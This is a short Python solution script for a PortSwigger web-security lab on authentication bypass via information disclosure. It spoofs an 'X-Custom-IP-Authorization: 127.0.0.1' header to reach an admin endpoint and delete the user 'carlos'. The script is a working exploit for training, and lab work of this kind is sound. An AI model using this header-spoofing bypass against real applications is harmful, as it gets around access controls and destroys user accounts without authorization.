#!/usr/bin/env python3
# Lab: Authentication bypass via information disclosure
# Lab-Link: https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-authentication-bypass
# Difficulty: APPRENTICE
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def main():
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Exampe: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    url = f'{host}/admin/delete?username=carlos'
    headers = {'X-Custom-IP-Authorization': '127.0.0.1'}
    r = requests.get(url, headers=headers, verify=False, proxies=proxies)
    
    if 'Congratulations, you solved the lab!' not in r.text:
        print(f'[-] Failed to delete user carlos')
        sys.exit(-5)

    print(f'[+] Deleted user carlos, lab solved')


if __name__ == "__main__":
    main()
